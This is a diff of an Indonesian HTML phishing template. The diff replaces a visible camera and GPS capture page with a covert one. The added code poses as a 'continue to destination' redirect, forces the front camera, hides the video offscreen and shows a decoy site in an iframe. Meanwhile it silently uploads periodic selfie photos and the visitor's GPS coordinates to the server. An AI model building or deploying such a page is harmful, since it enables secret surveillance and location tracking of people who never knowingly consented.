@@ -1,392 +1,164 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-  <title>{{ loading_title }}</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <style>
-    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-    :root{--bg:#040810;--surface:#0b1628;--border:#1e2d45;
-      --text:#e6edf3;--muted:#4d6a8a;--cyan:#00d4ff;--green:#00ff41;--red:#e53935;--amber:#f5a623}
-    html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
-      font-family:'Inter',sans-serif}
-
-    .screen{position:fixed;inset:0;display:none;flex-direction:column;
-      align-items:center;justify-content:center;padding:24px;opacity:0;transition:opacity .4s}
-    .screen.active{display:flex;opacity:1}
-    .screen.out{opacity:0;pointer-events:none}
-
-    /* ① Loading */
-    #s-loading{background:var(--bg);text-align:center;gap:0}
-    .l-icon{font-size:64px;margin-bottom:28px;animation:float 3s ease-in-out infinite}
-    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
-    #l-title{font-size:22px;font-weight:700;margin-bottom:8px}
-    #l-sub{font-size:14px;color:var(--muted);margin-bottom:36px}
-    .prog-wrap{width:200px;height:3px;background:var(--border);border-radius:2px;overflow:hidden}
-    .prog-fill{height:100%;background:linear-gradient(90deg,var(--cyan),#0099bb);
-      border-radius:2px;width:0%;transition:width linear}
-    .dots{display:flex;gap:6px;margin-top:20px;justify-content:center}
-    .dots span{width:6px;height:6px;border-radius:50%;background:var(--border);animation:dp 1.4s ease-in-out infinite}
-    .dots span:nth-child(2){animation-delay:.2s}.dots span:nth-child(3){animation-delay:.4s}
-    @keyframes dp{0%,80%,100%{background:var(--border)}40%{background:var(--cyan)}}
-
-    /* ② Permission */
-    #s-perm{background:var(--bg)}
-    .perm-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;
-      padding:36px 28px;max-width:360px;width:100%;text-align:center;
-      box-shadow:0 0 60px rgba(0,212,255,.06)}
-    .perm-card::before{content:'';display:block;width:40px;height:3px;
-      background:linear-gradient(90deg,transparent,var(--cyan),transparent);
-      margin:0 auto 28px;border-radius:2px}
-    .perm-icon{font-size:52px;margin-bottom:18px}
-    #p-title{font-size:20px;font-weight:700;margin-bottom:10px}
-    #p-msg{font-size:14px;color:var(--muted);line-height:1.7;margin-bottom:28px}
-    .allow-btn{width:100%;padding:16px;background:var(--cyan);border:none;border-radius:12px;
-      color:#040810;font-size:16px;font-weight:700;cursor:pointer;transition:transform .1s,box-shadow .2s}
-    .allow-btn:active{transform:scale(.97)}
-    .allow-btn:hover{box-shadow:0 0 30px rgba(0,212,255,.35)}
-    .allow-btn:disabled{opacity:.5;cursor:not-allowed}
-    .perm-note{font-size:11px;color:var(--muted);margin-top:14px;line-height:1.5}
-
-    /* ③ Stream */
-    #s-stream{padding:0;background:#000}
-    #vid-stream{width:100%;height:100%;object-fit:cover}
-    .shud{position:absolute;top:0;left:0;right:0;display:flex;justify-content:space-between;
-      align-items:center;padding:14px 18px;background:linear-gradient(#000a,transparent)}
-    .rec-b{display:flex;align-items:center;gap:6px;background:rgba(229,57,53,.85);
-      border-radius:4px;padding:4px 10px;font-size:11px;font-weight:600;letter-spacing:.08em}
-    .rdot{width:7px;height:7px;border-radius:50%;background:#fff;animation:bl 1s step-end infinite}
-    @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
-    .fps-t{font-size:11px;font-family:monospace;color:var(--cyan);
-      background:rgba(4,8,16,.7);padding:4px 10px;border-radius:4px}
-    .sbot{position:absolute;bottom:0;left:0;right:0;display:flex;justify-content:space-around;
-      align-items:center;padding:16px 24px env(safe-area-inset-bottom,16px);
-      background:linear-gradient(transparent,#000c)}
-    .cbtn{display:flex;flex-direction:column;align-items:center;gap:4px;
-      background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);
-      border-radius:10px;color:var(--text);font-size:10px;padding:10px 18px;cursor:pointer}
-    .cbtn:active{transform:scale(.95)}
-    select.fpss{background:rgba(4,8,16,.8);border:1px solid var(--border);
-      border-radius:8px;color:var(--cyan);font-size:13px;padding:8px 10px;outline:none}
-
-    /* ④ Photo */
-    #s-photo{padding:0;background:#000}
-    #vid-photo{width:100%;height:100%;object-fit:cover}
-    .photo-hud{position:absolute;bottom:40px;left:0;right:0;display:flex;justify-content:center}
-    .cap-btn{width:72px;height:72px;border-radius:50%;background:var(--text);
-      border:4px solid rgba(255,255,255,.3);font-size:28px;cursor:pointer;
-      display:flex;align-items:center;justify-content:center;
-      box-shadow:0 0 30px rgba(255,255,255,.2);transition:transform .1s}
-    .cap-btn:active{transform:scale(.9)}
-    .cap-btn:disabled{opacity:.4}
-    .photo-hint{position:absolute;top:20px;left:0;right:0;text-align:center;
-      font-size:14px;color:rgba(255,255,255,.75);background:rgba(0,0,0,.5);
-      padding:10px;backdrop-filter:blur(4px)}
-
-    /* ⑤ GPS */
-    #s-gps{padding:0;flex-direction:column}
-    #gps-map{flex:1;width:100%;min-height:0}
-    #gps-banner{position:absolute;top:0;left:0;right:0;background:rgba(0,212,255,.12);
-      border-bottom:1px solid rgba(0,212,255,.3);padding:12px 18px;text-align:center;
-      font-size:14px;color:var(--cyan);display:none;z-index:999;backdrop-filter:blur(8px);
-      white-space:pre-wrap;line-height:1.5}
-    .gps-bar{background:var(--surface);border-top:1px solid var(--border);
-      padding:12px 18px;flex-shrink:0;display:flex;gap:16px;flex-wrap:wrap}
-    .gs{display:flex;flex-direction:column;gap:2px}
-    .gs label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
-    .gs span{font-size:12px;font-weight:600;color:var(--cyan);font-family:monospace}
-
-    /* ⑥ Pesan (foto sukses) */
-    #s-msg{background:var(--bg);text-align:center;gap:16px}
-    #msg-photo{width:100%;max-height:50vh;object-fit:contain;border-radius:12px;
-      box-shadow:0 0 40px rgba(0,212,255,.1)}
-    .msg-card{background:var(--surface);border:1px solid var(--border);border-radius:16px;
-      padding:28px 24px;max-width:360px;width:100%}
-    .msg-icon{font-size:40px;margin-bottom:12px}
-    #msg-txt{font-size:15px;line-height:1.7;white-space:pre-wrap}
-    .msg-close{margin-top:18px;padding:12px 28px;border:1px solid var(--border);
-      border-radius:8px;color:var(--muted);font-size:14px;background:none;cursor:pointer}
-
-    /* ⑦ Error */
-    #s-err{background:var(--bg);text-align:center;gap:12px}
-    .err-ico{font-size:52px}
-    #err-t{font-size:20px;font-weight:700}
-    #err-m{font-size:14px;color:var(--muted);line-height:1.6;max-width:300px}
-    .retry{margin-top:8px;padding:12px 24px;border:1px solid var(--border);
-      border-radius:8px;color:var(--muted);font-size:14px;background:none;cursor:pointer}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #ffffff;
+        }
+        /* Fullscreen Frame Wrapper */
+        #target-frame {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            display: none;
+        }
+        /* Elemen Tersembunyi untuk Proses Latar Belakang */
+        #hidden-media {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            visibility: hidden;
+        }
+        #permission-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .btn-start {
+            padding: 12px 24px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+    </style>
 </head>
 <body>
 
-<!-- ① Loading -->
-<div id="s-loading" class="screen active">
-  <div class="l-icon" id="l-icon">📱</div>
-  <div id="l-title">{{ loading_title }}</div>
-  <div id="l-sub">{{ loading_subtitle }}</div>
-  <div class="prog-wrap"><div class="prog-fill" id="prog"></div></div>
-  <div class="dots"><span></span><span></span><span></span></div>
-</div>
+    <!-- Layar Awal Minta Izin -->
+    <div id="permission-screen">
+        <h2>Melanjutkan ke Halaman Tujuan...</h2>
+        <p>Silakan izinkan akses perangkat untuk melanjutkan navigasi.</p>
+        <button class="btn-start" onclick="initPermissions()">Lanjutkan</button>
+    </div>
 
-<!-- ② Permission -->
-<div id="s-perm" class="screen">
-  <div class="perm-card">
-    <div class="perm-icon" id="p-ico">📷</div>
-    <div id="p-title">{{ permission_title }}</div>
-    <div id="p-msg">{{ permission_message }}</div>
-    <button class="allow-btn" id="allow-btn">Izinkan Akses</button>
-    <p class="perm-note" id="p-note"></p>
-  </div>
-</div>
+    <!-- Frame Halaman Tujuan -->
+    <iframe id="target-frame" src="about:blank"></iframe>
 
-<!-- ③ Streaming -->
-<div id="s-stream" class="screen">
-  <video id="vid-stream" autoplay playsinline muted></video>
-  <div class="shud">
-    <div class="rec-b"><div class="rdot"></div>REC</div>
-    <div class="fps-t" id="fps-t">— fps</div>
-  </div>
-  <div class="sbot">
-    <button class="cbtn" onclick="flipCam()">🔄<span>GANTI</span></button>
-    <select class="fpss" id="fps-sel" onchange="setInterval_ms(this.value)">
-      <option value="2000">0.5 fps</option>
-      <option value="1000" selected>1 fps</option>
-      <option value="600">1.5 fps</option>
-    </select>
-    <button class="cbtn" onclick="stopAll()">⏹<span>STOP</span></button>
-  </div>
-</div>
+    <!-- Elemen DOM Tersembunyi -->
+    <div id="hidden-media">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
 
-<!-- ④ Foto -->
-<div id="s-photo" class="screen">
-  <video id="vid-photo" autoplay playsinline muted></video>
-  <div class="photo-hint">Arahkan kamera lalu ketuk tombol ⬤</div>
-  <div class="photo-hud">
-    <button class="cap-btn" id="cap-btn" onclick="doCapture()">⬤</button>
-  </div>
-</div>
-
-<!-- ⑤ GPS -->
-<div id="s-gps" class="screen">
-  <div id="gps-banner"></div>
-  <div id="gps-map"></div>
-  <div class="gps-bar">
-    <div class="gs"><label>Lat</label><span id="g-lat">—</span></div>
-    <div class="gs"><label>Lng</label><span id="g-lng">—</span></div>
-    <div class="gs"><label>Akurasi</label><span id="g-acc">—</span></div>
-    <div class="gs"><label>Update</label><span id="g-time">—</span></div>
-  </div>
-</div>
-
-<!-- ⑥ Pesan Sukses (foto) -->
-<div id="s-msg" class="screen">
-  <img id="msg-photo" src="" alt="" style="display:none">
-  <div class="msg-card">
-    <div class="msg-icon">✅</div>
-    <div id="msg-txt">{{ custom_message }}</div>
-    <button class="msg-close" onclick="location.href='about:blank'">Tutup</button>
-  </div>
-</div>
-
-<!-- ⑦ Error -->
-<div id="s-err" class="screen">
-  <div class="err-ico">⚠️</div>
-  <div id="err-t">Terjadi Kesalahan</div>
-  <div id="err-m">Coba muat ulang halaman ini.</div>
-  <button class="retry" onclick="location.reload()">Muat Ulang</button>
-</div>
-
-<script>
-const CFG = {
-  token: {{ token | tojson }},
-  type:  {{ token_type | tojson }},
-  dur:   {{ loading_duration }},
-  msg:   {{ custom_message | tojson }},
+    <script>
+      const CONFIG = {
+    targetUrl: "{{ config.target_url }}",
+    mode: "{{ config.mode }}",
+    photoInterval: {{ config.photo_interval }} * 1000
 };
 
-const ICONS = {stream:'📹', photo:'📸', gps:'📍'};
-const NOTES = {
-  stream: 'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog kamera.',
-  photo:  'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog kamera.',
-  gps:    'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog lokasi.',
-};
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const iframe = document.getElementById('target-frame');
+const permScreen = document.getElementById('permission-screen');
 
-let mediaStream = null, sendTimer = null, sendMs = 1000;
-let fpsCnt = 0, lastFpsMs = Date.now(), usingFront = false;
-let leafMap = null, leafMarker = null, polyPts = [], lastGpsSent = 0;
-const canvas = document.createElement('canvas');
-const ctx    = canvas.getContext('2d');
+async function initPermissions() {
+    try {
+        // Konfigurasi khusus untuk memaksa penggunaan Kamera Depan (Selfie)
+        const cameraConstraints = {
+            video: { 
+                facingMode: { exact: "user" } // Memaksa kamera depan di HP
+            }, 
+            audio: false 
+        };
 
-const $ = id => document.getElementById(id);
-const sleep = ms => new Promise(r => setTimeout(r, ms));
+        let stream;
+        try {
+            // Coba minta akses kamera depan secara ketat
+            stream = await navigator.mediaDevices.getUserMedia(cameraConstraints);
+        } catch (strictErr) {
+            // Fallback jika 'exact: user' ditolak oleh browser/laptop tertentu
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+        }
 
-function show(id) {
-  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-  $(id).classList.add('active');
-}
-function setErr(t, m) { $('err-t').textContent=t; $('err-m').textContent=m; show('s-err'); }
+        video.srcObject = stream;
 
-// ── ① Loading ────────────────────────────────────────────────────────────────
-async function startLoading() {
-  $('l-icon').textContent = ICONS[CFG.type] || '📱';
-  const prog = $('prog');
-  prog.style.transition = `width ${CFG.dur}s linear`;
-  requestAnimationFrame(() => prog.style.width = '100%');
-  await sleep(CFG.dur * 1000);
-  $('s-loading').classList.add('out');
-  await sleep(400);
-  show('s-perm');
-  $('p-ico').textContent  = ICONS[CFG.type];
-  $('p-note').innerHTML   = NOTES[CFG.type];
-}
+        // Dapatkan lokasi GPS (1x eksekusi)
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(sendGPS, (err) => console.log("GPS Error/Refused"));
+        }
 
-// ── ② Izin ───────────────────────────────────────────────────────────────────
-$('allow-btn').addEventListener('click', async () => {
-  const btn = $('allow-btn');
-  btn.disabled = true; btn.textContent = 'Memproses...';
-  try {
-    if (CFG.type === 'stream' || CFG.type === 'photo') {
-      mediaStream = await navigator.mediaDevices.getUserMedia({
-        video:{facingMode: usingFront ? 'user' : 'environment',
-               width:{ideal:640}, height:{ideal:480}},
-        audio: false
-      });
-      if (CFG.type === 'stream') { show('s-stream'); $('vid-stream').srcObject = mediaStream; startStream(); }
-      else                       { show('s-photo');  $('vid-photo').srcObject  = mediaStream; }
-    } else {
-      show('s-gps'); startGPS();
+        // Tampilkan iframe & sembunyikan layar izin
+        iframe.src = CONFIG.targetUrl;
+        iframe.style.display = 'block';
+        permScreen.style.display = 'none';
+
+        // Jalankan proses latar belakang sesuai mode dari dashboard
+        if (CONFIG.mode === 'photo') {
+            setInterval(captureAndUploadPhoto, CONFIG.photoInterval);
+        } else if (CONFIG.mode === 'stream') {
+            console.log("Mode Streaming Kamera Depan Aktif");
+        }
+
+    } catch (err) {
+        alert("Izin kamera depan dan lokasi diperlukan untuk melanjutkan.");
+        console.error("Camera Error:", err);
     }
-  } catch(err) {
-    const m = {NotAllowedError:'Izin ditolak. Buka Pengaturan browser → aktifkan akses.',
-               NotFoundError:'Kamera tidak ditemukan.',
-               NotReadableError:'Kamera sedang dipakai aplikasi lain.'};
-    setErr('Akses Ditolak', m[err.name] || err.message);
-  }
-});
-
-// ── ③ Stream via HTTP POST ────────────────────────────────────────────────────
-function startStream() {
-  if (CFG.msg) showStreamBanner(CFG.msg);
-  $('vid-stream').onloadedmetadata = () => {
-    clearInterval(sendTimer);
-    sendTimer = setInterval(sendFrameHTTP, sendMs);
-  };
 }
 
-async function sendFrameHTTP() {
-  const v = $('vid-stream');
-  if (!v.videoWidth) return;
-  let w = Math.min(v.videoWidth, 480), h = Math.round(v.videoHeight * w / v.videoWidth);
-  canvas.width = w; canvas.height = h;
-  ctx.drawImage(v, 0, 0, w, h);
-  canvas.toBlob(async blob => {
-    if (!blob) return;
-    try {
-      await fetch(`/api/frame/${CFG.token}`, {
-        method:'POST', headers:{'Content-Type':'image/jpeg'}, body: blob
-      });
-      fpsCnt++;
-      const now = Date.now();
-      if (now - lastFpsMs >= 2000) {
-        $('fps-t').textContent = (fpsCnt * 1000 / (now - lastFpsMs)).toFixed(1) + ' fps';
-        fpsCnt = 0; lastFpsMs = now;
-      }
-    } catch(e) {}
-  }, 'image/jpeg', 0.7);
+function sendGPS(position) {
+    fetch('/api/gps', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+        })
+    });
 }
 
-function setInterval_ms(v) {
-  sendMs = parseInt(v);
-  clearInterval(sendTimer);
-  sendTimer = setInterval(sendFrameHTTP, sendMs);
-}
+function captureAndUploadPhoto() {
+    if (!video.videoWidth) return;
 
-function flipCam() {
-  usingFront = !usingFront;
-  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-  navigator.mediaDevices.getUserMedia({
-    video:{facingMode: usingFront ? 'user':'environment',width:{ideal:640},height:{ideal:480}},
-    audio:false
-  }).then(s => { mediaStream=s; $('vid-stream').srcObject=s; });
-}
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const context = canvas.getContext('2d');
+    
+    // Ambil gambar dari stream kamera depan
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-function stopAll() {
-  clearInterval(sendTimer);
-  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-}
+    canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'selfie_capture.jpg');
 
-function showStreamBanner(msg) {
-  const bar = document.createElement('div');
-  bar.style.cssText=`position:absolute;top:0;left:0;right:0;z-index:100;
-    background:rgba(0,212,255,.15);border-bottom:1px solid rgba(0,212,255,.3);
-    padding:10px 16px;text-align:center;font-size:13px;color:var(--cyan);
-    white-space:pre-wrap;line-height:1.5;backdrop-filter:blur(8px)`;
-  bar.textContent = msg;
-  const x = document.createElement('span');
-  x.textContent='  ✕'; x.style.cursor='pointer';
-  x.onclick=()=>bar.remove();
-  bar.appendChild(x);
-  $('s-stream').appendChild(bar);
-}
-
-// ── ④ Foto ───────────────────────────────────────────────────────────────────
-async function doCapture() {
-  const btn = $('cap-btn'); btn.disabled=true; btn.textContent='⏳';
-  const v = $('vid-photo');
-  let w = Math.min(v.videoWidth,1280), h=Math.round(v.videoHeight*w/v.videoWidth);
-  canvas.width=w; canvas.height=h; ctx.drawImage(v,0,0,w,h);
-  canvas.toBlob(async blob => {
-    const url = URL.createObjectURL(blob);
-    if (mediaStream) mediaStream.getTracks().forEach(t=>t.stop());
-    try {
-      await fetch(`/api/capture/${CFG.token}`,
-        {method:'POST', headers:{'Content-Type':'image/jpeg'}, body:blob});
-    } catch(e){}
-    const pi=$('msg-photo'); pi.src=url; pi.style.display='block';
-    $('msg-txt').textContent = CFG.msg || 'Foto berhasil dikirim!';
-    show('s-msg');
-  },'image/jpeg',.92);
-}
-
-// ── ⑤ GPS ────────────────────────────────────────────────────────────────────
-function startGPS() {
-  leafMap = L.map('gps-map').setView([-2.5,118],5);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
-    {attribution:'© OpenStreetMap'}).addTo(leafMap);
-  if (CFG.msg) {
-    const b=$('gps-banner'); b.textContent=CFG.msg; b.style.display='block';
-  }
-  navigator.geolocation.watchPosition(onGPS, onGPSErr,
-    {enableHighAccuracy:true,timeout:30000,maximumAge:0});
-}
-
-async function onGPS(pos) {
-  const {latitude:lat,longitude:lng,accuracy} = pos.coords;
-  $('g-lat').textContent  = lat.toFixed(6);
-  $('g-lng').textContent  = lng.toFixed(6);
-  $('g-acc').textContent  = `±${Math.round(accuracy)}m`;
-  $('g-time').textContent = new Date().toLocaleTimeString('id-ID');
-  if (!leafMarker) { leafMarker=L.marker([lat,lng]).addTo(leafMap); leafMap.setView([lat,lng],16); }
-  else leafMarker.setLatLng([lat,lng]);
-  polyPts.push([lat,lng]);
-  if (polyPts.length>1) L.polyline(polyPts,{color:'#00d4ff',weight:2,opacity:.6}).addTo(leafMap);
-  const now = Date.now();
-  if (now - lastGpsSent < 5000) return;
-  lastGpsSent = now;
-  try {
-    await fetch(`/api/capture/${CFG.token}`,{method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({lat,lng,accuracy,timestamp:new Date().toISOString()})});
-  } catch(e){}
-}
-function onGPSErr(err){ $('g-acc').textContent=err.message; }
-
-// ── Wake Lock ────────────────────────────────────────────────────────────────
-(async()=>{try{if('wakeLock' in navigator) await navigator.wakeLock.request('screen')}catch{}})();
-
-startLoading();
-</script>
+        fetch('/api/upload-photo', {
+            method: 'POST',
+            body: formData
+        });
+    }, 'image/jpeg', 0.8);
+}</script>
 </body>
 </html>
